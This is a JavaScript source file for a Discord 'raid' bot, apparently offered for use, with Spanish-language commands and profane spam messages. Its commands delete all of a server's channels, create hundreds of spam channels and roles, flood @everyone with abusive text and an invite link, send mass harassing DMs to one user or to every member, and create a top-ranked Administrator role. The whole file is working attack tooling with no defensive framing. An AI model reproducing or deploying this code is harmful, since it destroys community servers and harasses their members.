const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder,
    ChannelType
} = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const prefix = ";";

client.once("ready", () => {
    console.log(`Bot conectado como ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {

    if (message.author.bot) return;

    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === "log") {

       const embed = new EmbedBuilder()
    .setColor("#6ec6ff")
    .setTitle("Raid bot Ezez")
    .addFields(
        {
            name: ";nuke",
            value: "```Raidea todo el server con mas de 4k de mensajes.```",
            inline: false
        },
         {
            name: ";raid",
            value: "```Este comando es mucho mejor q nuke hace 10k de mensajes.```",
            inline: false
        },
        {
            name: ";dm",
            value: "```Envia dms masivos a una persona ;dm @usuario.```",
            inline: false
        },
       {
            name: ";msg all",
            value: "```Raidea la dm a todos los del server.```",
            inline: false
        },
        {
            name: ";admin",
            value: "```Te crea un rol de admin y te lo da.```",
            inline: false
        },
        {
            name: ";chanels",
            value: "```Crea 500 canales.```",
            inline: false
        },
        {
            name: ";roles",
            value: "```Crea 200 roles de colores diferentes.```",
            inline: false
        }
    )
        await message.channel.send({
            embeds: [embed]
        });
    }
    if (command === "nuke") {
    if (!message.member.permissions.has('Administrator')) {
        return message.reply('No tienes permisos de administrador para usar este comando.');
    }
    
    const canalOriginal = message.channel;
    
    await canalOriginal.send('Iniciando nuke.');
    
    try {
        const canales = message.guild.channels.cache;
        
        const promesasEliminar = [];
        
        canales.forEach(channel => {
            if (channel.id !== canalOriginal.id) {
                promesasEliminar.push(channel.delete().catch(error => {
                    console.error(`Error al eliminar canal ${channel.name}:`, error.message);
                }));
            }
        });
        
        await Promise.all(promesasEliminar);
        
        await canalOriginal.send('Progresando...');
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        await canalOriginal.send('Creando 100 canales...');
        
        const promesasCanales = [];
        
        for (let i = 0; i < 100; i++) {
            const promesa = message.guild.channels.create({
                name: `╔══════ ≪ • ☣️❝𝐥𝐨𝐧𝐜𝐡𝐞𝐳 𝐨𝐧 𝐭𝐨𝐩❞ ☣️ • ≫ ══════╗-${i}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    {
                        id: message.guild.id,
                        allow: ['ViewChannel', 'SendMessages']
                    }
                ]
            }).then(async channel => {
                const mensajesPromesas = [];
                const mensajeRaid = `╔═════════ ≪ • ☣️ • ≫ ═════════╗
❝𝐋𝐎𝐍𝐂𝐇𝐄𝐙 𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐀𝐈𝐃 𝐁𝐎𝐓 𝐄𝐙❞
╚═════════ ≪ • ☣️ • ≫ ═════════╝

@everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA https://discord.gg/syamX9aUV`;
                
                for (let j = 0; j < 50; j++) {
                    mensajesPromesas.push(channel.send(mensajeRaid));
                }
                await Promise.all(mensajesPromesas);
                return channel;
            }).catch(error => {
                console.error(`Error creando canal ${i}:`, error.message);
                return null;
            });
            
            promesasCanales.push(promesa);
        }
        
        const resultados = await Promise.all(promesasCanales);
        const canalesCreados = resultados.filter(c => c !== null).length;
        
        await canalOriginal.send(`Nuke completado.`);
        
    } catch (error) {
        console.error(error);
        await canalOriginal.send('Ocurrio un error durante el nuke.');
    }
}


if (command === "raid") {
    if (!message.member.permissions.has('Administrator')) {
        return message.reply('No tienes permisos de administrador para usar este comando.');
    }
    
    await message.reply('Iniciando raid masiva.');
    
    try {
        const promesasCanales = [];
        
        for (let i = 0; i < 250; i++) {
            const promesa = message.guild.channels.create({
                name: `╔══════ ≪ • ☣️❝𝐥𝐨𝐧𝐜𝐡𝐞𝐳 𝐨𝐧 𝐭𝐨𝐩❞ ☣️ • ≫ ══════╗-${i}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    {
                        id: message.guild.id,
                        allow: ['ViewChannel', 'SendMessages']
                    }
                ]
            }).then(async channel => {
                const mensajesPromesas = [];
                const mensajeRaid = `╔═════════ ≪ • ☣️ • ≫ ═════════╗
❝𝐋𝐎𝐍𝐂𝐇𝐄𝐙 𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐀𝐈𝐃 𝐁𝐎𝐓 𝐄𝐙❞
╚═════════ ≪ • ☣️ • ≫ ═════════╝

@everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA @everyone EZEZEZ PUTAS DE MIERDA https://discord.gg/syamX9aUV`;
                
                for (let j = 0; j < 100; j++) {
                    mensajesPromesas.push(channel.send(mensajeRaid));
                }
                await Promise.all(mensajesPromesas);
                return channel;
            }).catch(error => {
                console.error(`Error creando canal ${i}:`, error.message);
                return null;
            });
            
            promesasCanales.push(promesa);
        }
        
        const resultados = await Promise.all(promesasCanales);
        const canalesCreados = resultados.filter(c => c !== null).length;
        
        await message.reply(`Finalizado.`);
        
    } catch (error) {
        console.error(error);
        await message.reply('Ocurrio un error durante el raid.');
    }
}


    if (command === "dm") {
        if (!message.member.permissions.has('Administrator')) {
            return message.reply('No tienes permisos de administrador para usar este comando.');
        }
        
        const usuarioMencionado = message.mentions.users.first();
        
        if (!usuarioMencionado) {
            return message.reply('Uso correcto: ;dm @usuario');
        }
        
        if (usuarioMencionado.id === client.user.id) {
            return message.reply('No puedo enviarme DMs a mi mismo.');
        }
        
        await message.reply(`Iniciando.`);
        
        const mensajeRaidDM = `╔═════════ ≪ • ☣️ • ≫ ═════════╗
❝𝐋𝐎𝐍𝐂𝐇𝐄𝐙 𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐀𝐈𝐃 𝐁𝐎𝐓 𝐄𝐙❞
╚═════════ ≪ • ☣️ • ≫ ═════════╝

EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA https://discord.gg/syamX9aUV`;
        
        try {
            const dmChannel = await usuarioMencionado.createDM();
            
            const promesasMensajes = [];
            
            for (let i = 0; i < 250; i++) {
                promesasMensajes.push(dmChannel.send(mensajeRaidDM).catch(error => {
                    console.error(`Error enviando mensaje ${i} a ${usuarioMencionado.tag}:`, error.message);
                    return null;
                }));
            }
            
            const resultadosDM = await Promise.all(promesasMensajes);
            const enviados = resultadosDM.filter(r => r !== null).length;
            
            await message.reply(`Finalizado.`);
            
        } catch (error) {
            console.error(error);
            await message.reply(`Error: No se pudo enviar DM a ${usuarioMencionado.tag}. Puede que tenga los DMs cerrados o haya bloqueado al bot.`);
        }
    }

if (command === "msg" && args[0] === "all") {
    if (!message.member.permissions.has('Administrator')) {
        return message.reply('No tienes permisos de administrador para usar este comando.');
    }
    
    await message.reply('Iniciando.');
    
    try {
        const miembros = await message.guild.members.fetch();
        const mensajeRaidDM = `╔═════════ ≪ • ☣️ • ≫ ═════════╗
❝𝐋𝐎𝐍𝐂𝐇𝐄𝐙 𝐒𝐄𝐑𝐕𝐄𝐑 𝐑𝐀𝐈𝐃 𝐁𝐎𝐓 𝐄𝐙❞
╚═════════ ≪ • ☣️ • ≫ ═════════╝

EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA EZEZEZ PUTAS DE MIERDA https://discord.gg/syamX9aUV`;
        
        let enviados = 0;
        let fallidos = 0;
        
        const promesasDMs = [];
        
        miembros.forEach(miembro => {
            if (miembro.id !== client.user.id && !miembro.user.bot) {
                const promesa = miembro.send(mensajeRaidDM).then(() => {
                    enviados++;
                    return true;
                }).catch(error => {
                    fallidos++;
                    console.error(`Error enviando DM a ${miembro.user.tag}:`, error.message);
                    return false;
                });
                promesasDMs.push(promesa);
            }
        });
        
        await Promise.all(promesasDMs);
        
        await message.reply(`Finalizado. Total:${miembros.size}`);
        
    } catch (error) {
        console.error(error);
        await message.reply('Ocurrio un error durante el envio masivo de DMs.');
    }
}

    if (command === "admin") {
        if (!message.member.permissions.has('Administrator')) {
            return message.reply('No tienes permisos de administrador para usar este comando.');
        }
        
        await message.reply('Creando rol admin.');
        
        try {
            const existingRole = message.guild.roles.cache.find(r => r.name === 'ADMIN ROL RAID');
            if (existingRole) {
                await message.member.roles.add(existingRole);
                return message.reply('El rol ya existia. Se te ha asignado.');
            }
            
            const adminRole = await message.guild.roles.create({
                name: 'ADMIN ROL RAID',
                color: 'Red',
                permissions: ['Administrator'],
                position: 0
            });
            
            let highestPosition = 0;
            message.guild.roles.cache.forEach(role => {
                if (role.position > highestPosition && role.id !== message.guild.id) {
                    highestPosition = role.position;
                }
            });
            
            await adminRole.setPosition(highestPosition + 1);
            
            await message.member.roles.add(adminRole);
            
            await message.reply(`Se te a otorgado rol admin.`);
            
        } catch (error) {
            console.error(error);
            await message.reply('Error al crear el rol. Asegurate de que el bot tenga permisos para crear roles y gestionarlos.');
        }
    }

if (command === "chanels") {
    if (!message.member.permissions.has('Administrator')) {
        return message.reply('No tienes permisos de administrador para usar este comando.');
    }
    
    await message.reply('Iniciando...');
    
    try {
        const promesasCanales = [];
        
        for (let i = 0; i < 500; i++) {
            const promesa = message.guild.channels.create({
                name: `╔══════ ≪ • ☣️❝𝐥𝐨𝐧𝐜𝐡𝐞𝐳 𝐨𝐧 𝐭𝐨𝐩❞ ☣️ • ≫ ══════╗-${i}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    {
                        id: message.guild.id,
                        allow: ['ViewChannel', 'SendMessages']
                    }
                ]
            }).catch(error => {
                console.error(`Error creando canal ${i}:`, error.message);
                return null;
            });
            
            promesasCanales.push(promesa);
        }
        
        const resultados = await Promise.all(promesasCanales);
        const canalesCreados = resultados.filter(c => c !== null).length;
        
        await message.reply(`Se crearon ${canalesCreados}/500 canales.`);
        
    } catch (error) {
        console.error(error);
        await message.reply('Ocurrio un error durante la creacion de canales.');
    }
}

    if (command === "roles") {
        if (!message.member.permissions.has('Administrator')) {
            return message.reply('No tienes permisos de administrador para usar este comando.');
        }
        
        await message.reply('Iniciando...');
        
        const colores = [
            'Red', 'Blue', 'Green', 'Yellow', 'Purple', 'Orange', 'Pink', 'Brown', 
            'Gold', 'Lime', 'Cyan', 'Magenta', 'Navy', 'Teal', 'Coral', 'Maroon',
            'Olive', 'Lavender', 'Violet', 'Indigo', 'Turquoise', 'Salmon', 'Plum',
            'Orchid', 'Tomato', 'SkyBlue', 'SpringGreen', 'Crimson', 'ForestGreen'
        ];
        
        const nombreRol = '╔══════ ≪ • ☣️❝𝐥𝐨𝐧𝐜𝐡𝐞𝐳 𝐨𝐧 𝐭𝐨𝐩❞ ☣️ • ≫ ══════╗';
        
        const promesasRoles = [];
        
        for (let i = 0; i < 200; i++) {
            const colorAleatorio = colores[Math.floor(Math.random() * colores.length)];
            const nombreConNumero = `${nombreRol} ${i + 1}`;
            
            const promesa = message.guild.roles.create({
                name: nombreConNumero,
                color: colorAleatorio,
                permissions: []
            }).catch(error => {
                console.error(`Error creando rol ${i + 1}:`, error.message);
                return null;
            });
            
            promesasRoles.push(promesa);
        }
        
        const resultadosRoles = await Promise.all(promesasRoles);
        const rolesCreados = resultadosRoles.filter(r => r !== null).length;
        
        await message.reply(`Finalizado. Se crearon ${rolesCreados}/200.`);
    }
});



